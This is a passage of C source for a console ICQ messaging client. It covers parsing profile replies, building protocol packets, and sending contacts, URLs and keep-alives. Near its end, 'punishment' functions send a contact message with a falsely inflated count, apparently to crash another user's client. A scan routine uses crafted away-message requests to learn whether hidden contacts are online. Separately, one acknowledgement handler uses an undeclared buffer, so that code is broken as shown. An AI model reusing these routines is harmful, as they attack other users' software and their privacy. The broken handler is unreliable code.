        /* buf should point to the TLV type field. */
        switch (Chars_2_Wordb( buf+x ))
        {
            case 0x3:
                len = Chars_2_Wordb(buf+x+2);
                /* time_t */
                if (len == 0x4)    {
                    aux = (int8_t *)&YSM_USER.timing.signOn;
                    aux[0] = buf[x+7];
                    aux[1] = buf[x+6];
                    aux[2] = buf[x+5];
                    aux[3] = buf[x+4];
                }

                 /* just cheat and quit */
                x = Chars_2_Wordb( head->dlen ) - SNAC_HEAD_SIZE;
                break;

            case 0x0a:
                /* get our external ip address */
                memcpy( &YSM_USER.d_con.rIP_ext, buf+x+4, 4 );
            default:
                /* buf + 2 should contain the TLV len data field. */
                x += Chars_2_Wordb( buf+x+2 );
                x += sizeof(tlv_bit_t);
                break;
        }
    }

    YSM_USER.delta = YSM_USER.timing.signOn - time(NULL);
    if (YSM_USER.delta < 0)
        YSM_USER.delta = 0;
}

void YSM_IncomingInfo(char type, char *buf, int tsize, unsigned int reqid)
{
    slave_t *victim;
    char    *pnick = NULL, *pfirst = NULL, *plast = NULL, *pemail = NULL;
    uin_t   *puin = NULL;

    /* Incoming is for ourselves? */
    if (reqid == (YSM_USER.uin & 0xffffff7f))
    {
        pnick = &YSM_USER.info.nickName[0];
        pfirst = &YSM_USER.info.firstName[0];
        plast = &YSM_USER.info.lastName[0];
        pemail = &YSM_USER.info.email[0];
    }
    else
    {
        victim = querySlave(SLAVE_REQID, NULL, 0, reqid);

        if (victim)
        {
            pnick = &victim->info.nickName[0];
            puin = &victim->uin;
        }
    }

    switch (type)
    {
        case INFO_MAIN:
            YSM_IncomingMainInfo(buf,
                    tsize,
                    pnick,
                    pfirst,
                    plast,
                    pemail,
                    reqid,
                    puin);
            break;

        case INFO_HP:
            YSM_IncomingHPInfo(buf, tsize);
            break;

        case INFO_WORK:
#if 0
            /* we disabled work info since we decided
             * it is a waste of screen space to display it
             */
            YSM_IncomingWorkInfo(buf, tsize);
#endif
            break;

        case INFO_ABOUT:
            YSM_IncomingAboutInfo(buf, tsize);
            break;

        default:
            break;
    }
}

void YSM_IncomingMainInfo(
    int8_t    *buf,
    int32_t    tsize,
    int8_t    *pnick,
    int8_t    *pfirst,
    int8_t    *plast,
    int8_t    *pemail,
    uint32_t   reqid,
    uin_t     *puin)
{
    int8_t    *data = NULL;
    bool_t     local = FALSE;
    int32_t    nlen = 0;

    if (buf == NULL)
        return;

    /* local is true if its ours */
    local = (reqid == (YSM_USER.uin & 0xffffff7f));

    /* first LNTS is NICK */
    nlen = Chars_2_Word(buf+tsize);
    tsize += 2;

    data = YSM_CALLOC(1, nlen+1);
    memcpy(data, buf+tsize, nlen);
    DEBUG_PRINT("data: %s", data);

    /* Update nicknames ? */
    if (pnick && (local || g_cfg.updateNicks > 0))
    {
        /* using strcmp here, to update even low/big caps */
        if (strlen(data) > 1 && strcmp(pnick, data))
        {
            if (YSM_ParseSlave(data))
            {
                if (local)
                {
                    strncpy(pnick, data, MAX_NICK_LEN-1);
                    pnick[MAX_NICK_LEN - 1] = '\0';
                }
                else
                    updateSlave(UPDATE_NICK, data, *puin);
            }
        }
    }

#if 0
    printfOutput(VERBOSE_BASE,
        "\r%-15.15s" " : %-12.12s ",
        "Nickname",     
        YSM_CharsetConvertOutputString(&data, 1));
#endif

    YSM_FREE(data);

    /* Next LNTS is.firstName */
    tsize += nlen;

    nlen = Chars_2_Word(buf+tsize);
    tsize += 2;

    data = YSM_CALLOC(1, nlen+1);
    memcpy(data, buf+tsize, nlen);

    if (pfirst)
    {
        strncpy( pfirst, data, MAX_NICK_LEN-1 );
        pfirst[MAX_NICK_LEN - 1] = '\0';
    }

#if 0
    printfOutput(VERBOSE_BASE,
        "%-20.20s" " : %s\n",
        "Firstname",
        YSM_CharsetConvertOutputString(&data, 1));
#endif

    YSM_FREE(data);

    tsize += nlen;

    nlen = Chars_2_Word(buf+tsize);
    tsize += 2;

    data = ysm_calloc(1, nlen+1, __FILE__, __LINE__);
    memcpy(data, buf+tsize, nlen);

    if (plast)
    {
        strncpy(plast, data, MAX_NICK_LEN-1);
        plast[MAX_NICK_LEN-1] = '\0';
    }

#if 0
    printfOutput(VERBOSE_BASE,
        "%-15.15s" " : %-12.12s ",
        "Lastname",
        YSM_CharsetConvertOutputString(&data, 1));
#endif

    YSM_FREE(data);

    tsize += nlen;
    nlen = Chars_2_Word(buf+tsize);
    tsize += 2;

    data = ysm_calloc(1, nlen+1, __FILE__, __LINE__);
    memcpy(data, buf+tsize, nlen);

    if (pemail) {
        strncpy( pemail, data, MAX_NICK_LEN-1 );
        pemail[MAX_NICK_LEN - 1] = '\0';
    }

#if 0
    printfOutput(VERBOSE_BASE,
        "%-20.20s" " : %s\n",
        "E-mail",
        YSM_CharsetConvertOutputString(&data, 1));
#endif

    YSM_FREE(data);

    tsize += nlen;
    nlen = Chars_2_Word(buf+tsize);
    tsize += 2;

    data = YSM_CALLOC(1, nlen+1);
    memcpy(data, buf+tsize, nlen);

#if 0
    printfOutput(VERBOSE_BASE,
        "\r%-15.15s" " : %-12.12s ",
        "City",
        YSM_CharsetConvertOutputString(&data, 1));
#endif

    YSM_FREE(data);

    tsize += nlen;
    nlen = Chars_2_Word(buf+tsize);
    tsize += 2;
    data = YSM_CALLOC(1, nlen+1);
    memcpy(data, buf+tsize, nlen);

#if 0
    printfOutput(VERBOSE_BASE,
        "%-20.20s" " : %s\n",
        "State",
        YSM_CharsetConvertOutputString(&data, 1));
#endif

    YSM_FREE(data);

    tsize += nlen;
    nlen = Chars_2_Word(buf+tsize);
    tsize += 2;
    data = YSM_CALLOC(1, nlen+1);
    memcpy(data, buf+tsize, nlen);

#if 0
    printfOutput(VERBOSE_BASE,
        "\r%-15.15s" " : %-12.12s ",
        "Phone",
        YSM_CharsetConvertOutputString(&data, 1));
#endif

    YSM_FREE(data);

    tsize += nlen;
    nlen = Chars_2_Word(buf+tsize);
    tsize += 2;
    data = YSM_CALLOC(1, nlen+1);
    memcpy(data, buf+tsize, nlen);

#if 0
    printfOutput(VERBOSE_BASE,
        "%-20.20s" " : %s\n",
        "FAX",
        YSM_CharsetConvertOutputString(&data, 1));
#endif

    YSM_FREE(data);

    tsize += nlen;
    nlen = Chars_2_Word(buf+tsize);
    tsize += 2;
    data = YSM_CALLOC(1, nlen+1);
    memcpy(data, buf+tsize, nlen);

#if 0
    printfOutput(VERBOSE_BASE,
        "\r%-15.15s" " : %-12.12s ",
        "Street",
        YSM_CharsetConvertOutputString(&data, 1));
#endif

    YSM_FREE(data);

    tsize += nlen;
    nlen = Chars_2_Word(buf+tsize);
    tsize += 2;
    data = YSM_CALLOC(1, nlen+1);
    memcpy(data, buf+tsize, nlen);

#if 0
    printfOutput(VERBOSE_BASE,
        "%-20.20s" " : %s\n",
        "Cellular",
        YSM_CharsetConvertOutputString(&data, 1));
#endif

    YSM_FREE(data);
}

void YSM_IncomingHPInfo(int8_t *buf, int32_t tsize)
{
    if (buf == NULL)
        return;

#if 0
    printfOutput(VERBOSE_BASE,
        "%-15.15s" " : %-12.u ",
        "Age",
        buf[tsize] );

    if (buf[tsize+2] != 0)
    {
        printfOutput(VERBOSE_BASE,
            "%-20.20s" " : %s\n",
            "Sex",
            (buf[tsize+2] == 0x02) ? "Male." : "Female.");
    }
#endif
}

void YSM_IncomingWorkInfo(int8_t *buf, int32_t tsize)
{
    int8_t  *data = NULL;
    int32_t  nlen = 0;

    if (buf == NULL)
        return;

    nlen = Chars_2_Word(buf+tsize);
    tsize += 2;
    data = YSM_CALLOC(1, nlen+1);
    memcpy(data, buf+tsize, nlen);

    printfOutput(VERBOSE_BASE,
        "\r%-15.15s" " : %-12.12s ",
        "City",
        YSM_CharsetConvertOutputString(&data, 1));

    YSM_FREE(data);

    tsize += nlen;
    nlen = Chars_2_Word(buf+tsize);
    tsize += 2;
    data = YSM_CALLOC(1, nlen+1);
    memcpy(data, buf+tsize, nlen);

    printfOutput(VERBOSE_BASE,
        "%-20.20s" " : %s\n",
        "State",
        YSM_CharsetConvertOutputString(&data, 1));

    YSM_FREE(data);
}

void YSM_IncomingAboutInfo(int8_t *buf, int32_t tsize)
{
    int8_t  *data = NULL;
    int16_t  len = 0;

    if (buf == NULL)
        return;

    len = Chars_2_Word(buf+tsize);
    tsize += 2;

    data = YSM_CALLOC(1, len+1);
    memcpy(data, buf+tsize, len);

#if 0
    printfOutput(VERBOSE_BASE,
        "\r\n%-15.15s" " : \n%s\n",
        "About",
        YSM_CharsetConvertOutputString(&data, 1));
#endif

    YSM_FREE(data);
}

static const uint8_t icq2003avstring[] =
{
    0x00,0x01,0x00,0x03,0x01,0x10,0x04,0x7c,
    0x00,0x13,0x00,0x02,0x01,0x10,0x04,0x7c,
    0x00,0x02,0x00,0x01,0x01,0x01,0x04,0x7c,
    0x00,0x03,0x00,0x01,0x01,0x10,0x04,0x7c,
    0x00,0x15,0x00,0x01,0x01,0x10,0x04,0x7c,
    0x00,0x04,0x00,0x01,0x01,0x10,0x04,0x7c,
    0x00,0x06,0x00,0x01,0x01,0x10,0x04,0x7c,
    0x00,0x09,0x00,0x01,0x01,0x10,0x04,0x7c,
    0x00,0x0A,0x00,0x01,0x01,0x10,0x04,0x7c,
    0x00,0x0B,0x00,0x01,0x01,0x10,0x04,0x7c,
};

void sendCliReady(void)
{
    static const uint8_t icq2000vstring[] =
    {
        0x00,0x01,0x00,0x03,0x01,0x10,0x02,0x8A,0x00,0x02,0x00,
        0x01,0x01,0x01,0x02,0x8A,0x00,0x03,0x00,0x01,0x01,0x10,
        0x02,0x8A,0x00,0x15,0x00,0x01,0x01,0x10,0x02,0x8A,0x00,
        0x04,0x00,0x01,0x01,0x10,0x02,0x8A,0x00,0x06,0x00,0x01,
        0x01,0x10,0x02,0x8A,0x00,0x09,0x00,0x01,0x01,0x10,0x02,
        0x8A,0x00,0x0A,0x00,0x01,0x01,0x10,0x02,0x8A,
    };

    sendSnac(YSM_BASIC_SERVICE_SNAC, CLI_READY, 0x0,
        icq2000vstring,
        sizeof(icq2000vstring),
        g_sinfo.seqnum++,
        0);
}

void sendIcbmParams(void)
{
    static const int8_t icqICBM[] =
    {
        0x00,0x00,              /* channel to setup */
        0x00,0x00,0x00,0x03,    /* messages flags */ 
        0x1F,0x40,              /* max message snac size */
        0x03,0xE7,              /* max sender warning level */
        0x03,0xE7,              /* max receiver warning level */
        0x00,0x00,              /* minimum message interval (sec) */
        0x00,0x00,              /* unknown */
    };

    sendSnac(YSM_MESSAGING_SNAC, SET_ICBM_PARAMS, 0x0,
        icqICBM,
        sizeof(icqICBM),
        g_sinfo.seqnum++,
        0);
}

void sendCapabilities(void)
{
    static const uint8_t icqCapabilities[] =
    {
        CAP_PRECAP CAP_SRVRELAY CAP_POSCAP
        CAP_PRECAP CAP_ISICQ    CAP_POSCAP
#ifdef YSM_USE_CHARCONV
        CAP_PRECAP CAP_UTF8     CAP_POSCAP
#endif
    };

    bsd_t    bsd;
    bs_pos_t tlv5;

    bsd = initBs();
    tlv5 = bsAppendTlv(bsd, 0x05, 0, NULL);
    /* without null-terminator */
    bsAppend(bsd, icqCapabilities, sizeof(icqCapabilities) - 1);
    bsUpdateTlvLen(bsd, tlv5);

    sendSnac(0x02, 0x04, 0x0,
        bsGetBuf(bsd),
        bsGetLen(bsd),
        g_sinfo.seqnum++,
        0);

    freeBs(bsd);
}

int32_t sendMetaInfoReq(uin_t uin, int16_t subType)
{
    bsd_t     bsd;
    bs_pos_t  tlv1;
    bs_pos_t  len;
    int32_t   reqId;

    bsd = initBs();

    tlv1 = bsAppendTlv(bsd, 0x01, 0, NULL);
    len = bsAppendWordLE(bsd, 0);           /* data chunk size */
    bsAppendDwordLE(bsd, YSM_USER.uin);     /* request owner uin */
    bsAppendWordLE(bsd, 0x07D0);            /* request type: META_DATA_REQ */
    bsAppendWordLE(bsd, 0x0000);            /* request sequence number */
    bsAppendWordLE(bsd, subType);           /* request subtype */
    bsAppendDwordLE(bsd, uin);              /* uin to search */
    bsUpdateWordLELen(bsd, len);
    bsUpdateTlvLen(bsd, tlv1);

    reqId = uin & 0xffffff7f;

    sendSnac(YSM_MULTIUSE_SNAC, YSM_CLI_SEND_REQ, 0x0,
        bsGetBuf(bsd),
        bsGetLen(bsd),
        g_sinfo.seqnum++,
        reqId);

    freeBs(bsd);

    return reqId;
}

void sendOfflineMsgsReq(void)
{
    bsd_t    bsd;
    bs_pos_t tlv1;
    bs_pos_t len;

    DEBUG_PRINT("");

    bsd = initBs();

    /* TLV 0x01: encapsulated META_DATA */
    tlv1 = bsAppendTlv(bsd, 0x01, 0, NULL);
    len = bsAppendWordLE(bsd, 0);         /* data chunk size */
    bsAppendDwordLE(bsd, YSM_USER.uin);   /* client uin */
    bsAppendWordLE(bsd, 0x3C);            /* data type: offline msgs request */
    bsAppendWordLE(bsd, 0x00);            /* request id */
    bsUpdateWordLELen(bsd, len);
    bsUpdateTlvLen(bsd, tlv1);

    sendSnac(YSM_MULTIUSE_SNAC, YSM_CLI_SEND_REQ, 0x00,
        bsGetBuf(bsd),
        bsGetLen(bsd),
        g_sinfo.seqnum++,
        0);

    freeBs(bsd);
}

void sendDeleteOfflineMsgsReq(void)
{
    bsd_t    bsd;
    bs_pos_t tlv1;
    bs_pos_t len;

    DEBUG_PRINT("");

    bsd = initBs();

    /* TLV 0x01: encapsulated META_DATA */
    tlv1 = bsAppendTlv(bsd, 0x01, 0, NULL);
    len = bsAppendWordLE(bsd, 0);          /* data chunk size */
    bsAppendDwordLE(bsd, YSM_USER.uin);    /* client uin */
    bsAppendWordLE(bsd, 0x3E);             /* data type: delete offline msgs */
    bsAppendWordLE(bsd, 0x00);             /* request id */
    bsUpdateWordLELen(bsd, len);
    bsUpdateTlvLen(bsd, tlv1);

    sendSnac(YSM_MULTIUSE_SNAC, YSM_CLI_SEND_REQ, 0x00,
        bsGetBuf(bsd),
        bsGetLen(bsd),
        g_sinfo.seqnum++,
        0);

    freeBs(bsd);
}

void sendICBMRightsReq(void)
{
    sendSnac(YSM_MESSAGING_SNAC, YSM_REQUEST_PARAM_INFO, 0x00,
        NULL, 0, g_sinfo.seqnum++, 0);
}

void sendBuddyRightsReq(void)
{
    sendSnac(0x03, 0x02, 0x00,
        NULL, 0, g_sinfo.seqnum++, 0);
}

void sendCheckContactsReq(void)
{
    bsd_t bsd;

    bsd = initBs();

    bsAppendDword(bsd, 0); /* modification date/time of client local SSI copy */
    bsAppendWord(bsd, 0);  /* numbers of items in client local SSI copy */

    sendSnac(YSM_ICQV8FUNC_SNAC, YSM_CLI_REQ_ROSTER, 0x0,
        bsGetBuf(bsd),
        bsGetLen(bsd),
        g_sinfo.seqnum++,
        0);

    freeBs(bsd);
}

void YSM_RequestPersonal(void)
{
    sendSnac(0x01, 0x0E, 0x0,
        NULL, 0, g_sinfo.seqnum++, 0x0E);

    /* Not only send the damn 01 0E snac, get our info too! */
    sendMetaInfoReq(YSM_USER.uin, CLI_FULLINFO2_REQ);
}

void YSM_RequestRates(void)
{
    sendSnac(0x01, 0x06, 0x0,
        NULL, 0, g_sinfo.seqnum++, 0);
}

void YSM_RequestAutoMessage(slave_t *victim)
{
    int8_t mtype = 0;
    int8_t data[2];

    if (victim == NULL) return;

    switch (victim->status)
    {
        case STATUS_AWAY:
            mtype = YSM_MESSAGE_GETAWAY;
            break;
        case STATUS_DND:
            mtype = YSM_MESSAGE_GETDND;
            break;
        case STATUS_NA:
            mtype = YSM_MESSAGE_GETNA;
            break;
        case STATUS_OCCUPIED:
            mtype = YSM_MESSAGE_GETOCC;
            break;
        case STATUS_FREE_CHAT:
            mtype = YSM_MESSAGE_GETFFC;
            break;
        default:
            return;
    }

    data[0] = 0x00;
    data[1] = 0x00;

    sendMessage2Client(victim,
        victim->uin,
        0x02,
        mtype,
        data,
        1,
        0x03,
        MFLAGTYPE_NORM,
        rand() & 0xffffff7f);
}

void sendFindByMailReq(uint8_t *contactMail)
{
    bsd_t     bsd;
    bs_pos_t  tlv1;
    bs_pos_t  len;
    bs_pos_t  tlvLen;

    bsd = initBs();

    tlv1 = bsAppendTlv(bsd, 0x01, 0, NULL);
    len = bsAppendWordLE(bsd, 0);           /* data chunk size */
    bsAppendDwordLE(bsd, YSM_USER.uin);     /* request owner uin */
    bsAppendWordLE(bsd, 0x07D0);            /* request type: META_DATA_REQ */
    bsAppendWordLE(bsd, 0x0000);            /* request sequence number */
    bsAppendWordLE(bsd, 0x0573);            /* request subtype */
    bsAppendWordLE(bsd, 0x015E);            /* TLV 0x015E: email to search */
    tlvLen = bsAppendWordLE(bsd, 0);        /* tlv len */
    bsAppendWordLE(bsd, strlen(contactMail)+1); /* stringz len */
    bsAppendPrintfStringZ(bsd, contactMail);
    bsUpdateWordLELen(bsd, tlvLen);
    bsUpdateWordLELen(bsd, len);
    bsUpdateTlvLen(bsd, tlv1);

    sendSnac(YSM_MULTIUSE_SNAC, YSM_CLI_SEND_REQ, 0x0,
        bsGetBuf(bsd),
        bsGetLen(bsd),
        g_sinfo.seqnum++,
        0);

    freeBs(bsd);
}


void sendSetBasicUserInfoReq(void)
{
    bsd_t     bsd;
    bs_pos_t  tlv1;
    bs_pos_t  len;
    uint8_t   publishMail = 0x1;

    bsd = initBs();

    tlv1 = bsAppendTlv(bsd, 0x01, 0, NULL);
    len = bsAppendWordLE(bsd, 0);           /* data chunk size */
    bsAppendDwordLE(bsd, YSM_USER.uin);     /* request owner uin */
    bsAppendWordLE(bsd, 0x07D0);            /* request type: META_DATA_REQ */
    bsAppendWordLE(bsd, 0x0000);            /* request sequence number */
    bsAppendWordLE(bsd, 0x03EA);            /* request subtype */

    bsAppendWordLE(bsd, strlen(YSM_USER.info.nickName)+1);  /* stringz len */
    bsAppendPrintfStringZ(bsd, YSM_USER.info.nickName);
    bsAppendWordLE(bsd, strlen(YSM_USER.info.firstName)+1); /* stringz len */
    bsAppendPrintfStringZ(bsd, YSM_USER.info.firstName);
    bsAppendWordLE(bsd, strlen(YSM_USER.info.lastName)+1);  /* stringz len */
    bsAppendPrintfStringZ(bsd, YSM_USER.info.lastName);
    bsAppendWordLE(bsd, strlen(YSM_USER.info.email)+1);     /* stringz len */
    bsAppendPrintfStringZ(bsd, YSM_USER.info.email);
    bsAppendWordLE(bsd, 0);         /* stringz len */
    bsAppendByte(bsd, 0);           /* empty stringz for city */
    bsAppendWordLE(bsd, 0);         /* stringz len */
    bsAppendByte(bsd, 0);           /* empty stringz for state */
    bsAppendWordLE(bsd, 0);         /* stringz len */
    bsAppendByte(bsd, 0);           /* empty stringz for phone */
    bsAppendWordLE(bsd, 0);         /* stringz len */
    bsAppendByte(bsd, 0);           /* empty stringz for fax */
    bsAppendWordLE(bsd, 0);         /* stringz len */
    bsAppendByte(bsd, 0);           /* empty stringz for address */
    bsAppendWordLE(bsd, 0);         /* stringz len */
    bsAppendByte(bsd, 0);           /* empty stringz for cellular */
    bsAppendWordLE(bsd, 0);         /* stringz len */
    bsAppendByte(bsd, 0);           /* empty stringz for zip */
    bsAppendWordLE(bsd, 0);         /* country code */
    bsAppendByte(bsd, 0);           /* GMT offset */
    bsAppendByte(bsd, publishMail); /* publish primary email flag */

    bsUpdateWordLELen(bsd, len);
    bsUpdateTlvLen(bsd, tlv1);

    sendSnac(YSM_MULTIUSE_SNAC, YSM_CLI_SEND_REQ, 0x0,
        bsGetBuf(bsd),
        bsGetLen(bsd),
        g_sinfo.seqnum++,
        0);

    freeBs(bsd);
}

void sendSetPasswordReq(uint8_t *newPassword)
{
    bsd_t    bsd;
    bs_pos_t tlv1;
    bs_pos_t len;

    bsd = initBs();
    tlv1 = bsAppendTlv(bsd, 0x01, 0, NULL);
    len = bsAppendWordLE(bsd, 0);
    bsAppendDwordLE(bsd, YSM_USER.uin);
    bsAppendWordLE(bsd, 0x07D0);                  /* data type */
    bsAppendWordLE(bsd, 0x02);                    /* request sequence number */
    bsAppendWordLE(bsd, 0x042E);                  /* data subtype */
    bsAppendWordLE(bsd, strlen(newPassword) + 1); /* password stringz length */
    bsAppendPrintfStringZ(bsd, newPassword);      /* password stringz */
    bsUpdateWordLELen(bsd, len);
    bsUpdateTlvLen(bsd, tlv1);

    sendSnac(YSM_MULTIUSE_SNAC, YSM_CLI_SEND_REQ, 0x0,
        bsGetBuf(bsd),
        bsGetLen(bsd),
        g_sinfo.seqnum++,
        0);

    freeBs(bsd);
}

void sendKeepAlive(void)
{
    bsd_t    bsd;
    bs_pos_t tlv1;

    bsd = initBs();

    printfOutput(VERBOSE_MOATA, "INFO Sending KEEP Alive Packet.\n");

    tlv1 = bsAppendTlv(bsd, 0x01, 0, NULL);
    bsAppendWordLE(bsd, 0x08);          /* data chunk size (TLV.len - 2) */
    bsAppendDwordLE(bsd, YSM_USER.uin); /* request owner uin */
    bsAppendWordLE(bsd, 0x07D0);        /* request type */
    bsAppendWordLE(bsd, 0x0000);        /* request sequence number */
    bsUpdateTlvLen(bsd, tlv1);

    sendSnac(YSM_MULTIUSE_SNAC, YSM_CLI_SEND_REQ, 0x0, 
        bsGetBuf(bsd),
        bsGetLen(bsd),
        g_sinfo.seqnum++, 0);

    freeBs(bsd);
}

/* Attention, datalist must be in the following format:
 *
 * UIN (ascii) 0xFE  NICK (ascii) 0xFE
 * and so on for each contact you want to send
 * and amount is in string, examples are : '1', "20", etc :)
 */

void YSM_SendContact(slave_t *victim, char *datalist, char *am)
{
    char *smashed_slices_of_rotten_meat;
    int buf_len = 0, tsize = 0;

    buf_len = strlen(am) + 1 + strlen(datalist);

    smashed_slices_of_rotten_meat = YSM_CALLOC(1, buf_len);

    /* amount of contacts to send , its in ascii */
    memcpy(smashed_slices_of_rotten_meat+tsize, am, strlen(am));
    tsize += strlen(am);
    smashed_slices_of_rotten_meat[tsize] = (char)0xFE;
    tsize ++;
    memcpy(smashed_slices_of_rotten_meat+tsize, datalist, strlen(datalist));
    tsize += strlen(datalist);

    if (victim->d_con.flags & DC_CONNECTED)
    {
        YSM_DC_Message(victim,
            &smashed_slices_of_rotten_meat[0],
            tsize,
            YSM_MESSAGE_CONTACTS);
    }
    else
    {
        sendMessage2Client(victim,
            victim->uin,
            0x04,
            YSM_MESSAGE_CONTACTS,
            smashed_slices_of_rotten_meat,
            tsize,
            0x00,
            0x00,
            rand() & 0xffffff7f);
    }

    YSM_FREE(smashed_slices_of_rotten_meat);
}

void YSM_SendUrl(slave_t *victim, int8_t *url, int8_t *desc)
{
    int8_t  *data = NULL;
    int32_t  size = 0;

    size = strlen(url) + strlen(desc) + 3;
    data = YSM_CALLOC(1, size);

    size = 0;
    memcpy( data+size, desc, strlen(desc));
    size += strlen(desc);
    data[size] = (char)0xFE;
    size ++;
    memcpy( data+size, url, strlen(url) );
    size += strlen(url) + 1;
    data[size] = (char)0xFE;

    if (victim->d_con.flags & DC_CONNECTED)
    {
        YSM_DC_Message(victim,
            data,
            size,
            YSM_MESSAGE_URL);
    }
    else
    {
        sendMessage2Client(victim,
            victim->uin,
            0x04,
            YSM_MESSAGE_URL,
            data,
            size,
            0x00,
            0x00,
            rand() & 0xffffff7f);
    }

    YSM_FREE(data);
}

void YSM_SendRTF(slave_t *victim)
{
    int8_t rtfmessage[] =
        "{\\rtf1\\ansi\\ansicpg1252\\deff0\\deflang1033{\\fonttbl{\\f0"
        "\\fnil\\fcharset0 Times New Roman;}}\r\n"
        "{\\colortbl ;\\red0\\green0\\blue0;}\r\n"
        "\\viewkind4\\uc1\\pard\\cf1\\f0\\fs20<##icqimage0001> \\par\r\n"
        "}\r\n";
    uint8_t flags = 0;

    flags |= MFLAGTYPE_NORM;
    flags |= MFLAGTYPE_RTF;

    sendMessage2Client(
        victim,
        victim->uin,
        0x02,
        YSM_MESSAGE_NORMAL,
        rtfmessage,
        sizeof(rtfmessage),
        0x00,
        flags,
        0x06000c00);
}

void YSM_Incoming_ClientAck(flap_head_t *flap, bsd_t bsd)
{
    uint8_t   *autotext = NULL;
    uint8_t   *mType = NULL;
    uint32_t   pos = 0, ulen = 0;
    uint16_t   txtlen = 0;
    uint16_t   type;

    bsSeek(bsd, 8, BS_SEEK_CUR);
    bsReadWord(bsd, &type);

    if (type != 0x02)
    {
        /* this should be a type 2 ACK */
        return;
    }

    /* here comes a BSTR with the UIN */
    ulen = buf[pos];
    if (ulen > MAX_UIN_LEN)
    {
        /* someone is fcking with us? */
        return;
    }

    pos += (ulen + 1);
    pos += 2;

    if (buf[pos] != 0x1b && buf[pos] != 0x00)
    {
        /* this should be the len of a sub chunk.
         * we only allow either 1b or 0.
         */
        return;
    }

    ulen = buf[pos];
    pos += 2;
    pos += ulen;

    pos += 4;
    pos += 12;

    /* we only care about 'auto message' replies */
    mType = buf+pos;
    if (*mType != 0xe8
        && *mType != 0xe9
        && *mType != 0xea
        && *mType != 0xeb
        && *mType != 0xec) {

        return;
    }

    pos += 2;
    pos += 2;
    pos += 2;

    txtlen = Chars_2_Wordb(&buf[pos]);
    pos += 2;
    if (txtlen > 0x00)
    {
        /* there is an automessage text! */
        autotext = ysm_calloc(1, txtlen + 1, __FILE__, __LINE__);
        memcpy(autotext, buf+pos, txtlen);

        printfOutput(VERBOSE_BASE,
            "\r\n%-15.15s" " : \n%s\n",
            "Auto message",
            YSM_CharsetConvertOutputString(&autotext, 1));

        YSM_FREE(autotext);
    }
}

/* Can either be call from 4,1 or 4,c, check inside */

void incomingScanRsp(snac_head_t *snac)
{
    slave_t *slave = NULL;

    while (slave = getNextSlave(slave))
    {
        if (snac->reqId == slave->reqId)
        {
            g_sinfo.scanqueue--;

            /* check if the user is waiting in a scan */
            if (slave->flags & FL_SCANNED)
            {
                if (snac->subTypeId == 0x01)
                {
                    printfOutput(VERBOSE_BASE, "INFO SCAN %ld %s CONNECTED\n",
                        slave->uin,
                        slave->info.nickName);
                }
                else if (snac->subTypeId == 0x0C)
                {
                    printfOutput(VERBOSE_BASE, "INFO SCAN %ld %s NOT_CONNECTED\n",
                        slave->uin,
                        slave->info.nickName);
                }
                slave->flags ^= FL_SCANNED;
            }
            break;
        }
    }
}

static void YSM_Scan_Slave(slave_t *slave)
{
    int8_t  dead_slave_skull[3];
    int32_t buf_len = 0, tsize = 0, reqid = 0;

    buf_len = sizeof(dead_slave_skull);
    memset(dead_slave_skull, 0, buf_len);

    /* length of the following msg */
    dead_slave_skull[1] = 0x01;
    tsize += 3; /* last byte 0 */

    reqid = rand() & 0xffffff7f;
    /* We hard-code E8 since its the same, Get AWAY automsg */
    sendMessage2Client(
        slave,
        slave->uin,
        0x02,
        0xE8,
        dead_slave_skull,
        tsize,
        0x19,
        0x00,
        reqid);

    slave->reqId = reqid;
}

/*
 * Set of Slave Punishment functions.
 * * Attention * No real slaves were wasted during testings of these functions.
 * Any simmilarity with reality is just pure coincidence.
 **/

void YSM_War_Kill(slave_t *victim)
{
    char *smelling_poison, *kill_uin = "66666666666", *kill_nick = "YSM__d0ll";
    int buf_len = 0, tsize = 0;

    buf_len = strlen(kill_uin) + 1 + strlen(kill_nick) + 1;
    smelling_poison = YSM_CALLOC(1, buf_len);

    memcpy(&smelling_poison[0], kill_uin, strlen(kill_uin));
    tsize += strlen(kill_uin);
    smelling_poison[tsize] = (char)0xFE;
    tsize++;
    memcpy(smelling_poison+tsize, kill_nick, strlen(kill_nick));
    tsize += strlen(kill_nick);
    smelling_poison[tsize] = (char)0xFE;
    tsize++;

    YSM_SendContact(victim, &smelling_poison[0], "65535");
    YSM_CloseDC(victim);

    printfOutput(VERBOSE_BASE, "INFO ..blood in my hands..i'm done with the job.\n");

    YSM_FREE(smelling_poison);
}

/* Thanks to an anonymous liquidk for the required info =) */
/* You are credited as a heroe. heh.               */

void YSM_War_Scan(slave_t *victim)
{
    slave_t *slave = NULL;
    int32_t  count = 0;

    printfOutput(VERBOSE_BASE, "Please wait...\n");
    if (victim != NULL)
    {
        if (!(victim->flags & FL_SCANNED))
        {
            g_sinfo.scanqueue++;
            YSM_Scan_Slave(victim);
            victim->flags |= FL_SCANNED;
        }
        else
        {
            printfOutput(VERBOSE_BASE,
                "INFO Wait! already waiting a reply from this slave!");
        }

        return;
    }

    /* Err this part of the code needs to be re-implemented */
    /* scanning a whole list is a huge problem, only works now */
    /* for a specified slave.                */

    while (slave = getNextSlave(slave))
    {
        if (count >= MAX_SCAN_COUNT)
            break;

        if (!(slave->flags & FL_SCANNED))
        {
            printfOutput(VERBOSE_BASE, "INFO Scanning %s..\n",
                 slave->info.nickName);

            YSM_Scan_Slave(slave);
            slave->flags |= FL_SCANNED;
            count++;
        }
    }

    g_sinfo.scanqueue += MAX_SCAN_COUNT;

    printfOutput(VERBOSE_BASE,
        "Please wait until %d results show up (or the few left).\n",
        MAX_SCAN_COUNT);

    printfOutput(VERBOSE_BASE,
        "Use 'scan' again to scan the missing slaves "
        "in groups of %d.\n", MAX_SCAN_COUNT);

    if (!count)
    {
        printfOutput(VERBOSE_BASE,
            "-- done with ALL SLAVES. (yo'r welcome).\n" );
    }
}

/* end of Punishment functions */

int8_t *readSnac(snac_head_t *snac, const int8_t *buf)
{
    const int8_t *ptr = buf;

    READ_UINT16(&(snac->familyId), ptr);
    READ_UINT16(&(snac->subTypeId), ptr);
    READ_UINT16(&(snac->flags), ptr);
    READ_UINT32(&(snac->reqId), ptr);

    return buf + SNAC_HEAD_SIZE;
}

int8_t *readTLV(tlv_t *tlv, const int8_t *buf)
{
    tlv->type = Chars_2_Wordb(buf);
    tlv->len = Chars_2_Wordb(buf+2);

    return buf + 4;
}

int8_t *readUint8(uint8_t *uint8, const int8_t *buf)
{
    *uint8 = (uint8_t)*buf;

    return buf + 1;
}

int8_t *readUint16(uint16_t *uint16, const int8_t *buf)
{
    *uint16 = Chars_2_Wordb(buf);

    return buf + 2;
}

